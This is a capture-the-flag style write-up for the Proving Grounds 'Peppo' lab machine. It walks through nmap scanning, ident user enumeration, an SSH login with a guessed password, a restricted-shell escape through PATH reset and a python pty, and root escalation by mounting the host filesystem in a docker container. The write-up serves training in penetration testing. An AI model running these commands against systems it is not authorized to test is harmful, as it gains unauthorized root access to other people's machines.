---
description: Pg Practice Peppo writeup
---

# Peppo

## Nmap

```
sudo nmap 192.168.100.60 -p- -sS -sV

PORT      STATE  SERVICE           VERSION
22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
53/tcp    closed domain
113/tcp   open   ident             FreeBSD identd
5432/tcp  open   postgresql        PostgreSQL DB 9.6.0 or later
8080/tcp  open   http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
10000/tcp open   snet-sensor-mgmt?
```

As `ident` is running we can use the Perl script `ident-user-enum` to identify which services are running under what user.

![](<../../../.gitbook/assets/image (993).png>)

Port 10000 reports it is running under the user 'eleanor'. I tried Bruteforcing the username on `SSH` and had no luck. Eventually simply trying `eleanor:elenaor` I was able to login on SSH.

![](<../../../.gitbook/assets/image (994).png>)

We see from trying the `id` command we are locked in with a restricted bash shell. Checking out our command availability by viewing `$PATH` we can see what binaries we have access to.

![](<../../../.gitbook/assets/image (995).png>)

Checking GTFObins for any of these binaries than can spawn a shell to escape a restricted one:

![](<../../../.gitbook/assets/image (996).png>)

After running the above command we can export a new path and then spawn a python shell then again export the path to have full functionover the shell session.

```
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
python -c 'import pty; pty.spawn("/bin/bash")'
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

![](<../../../.gitbook/assets/image (997).png>)

The command `id` shows we are a member of the docker group. GTFObins again shows a method for spawning a root shell when we are a member of the docker group.

![](<../../../.gitbook/assets/image (998) (1).png>)

First check what images we have available to us:

```
docker image ls
```

![](<../../../.gitbook/assets/image (999).png>)

We can use the GTFObins command replacing the value `<alpine>` with one of the images listed above.

```
docker run -v /:/mnt --rm -it redmine chroot /mnt sh
```

Returning a shell as root:

![](<../../../.gitbook/assets/image (1000).png>)

{% hint style="success" %}
If you found this page helpful to you, please rate below as per the feedback options. For any corrections or general communications, please see the root page [**Pentest Everything**](http://localhost:5000/s/-MFlgUPYI8q83vG2IJpI/) for contact information.
{% endhint %}
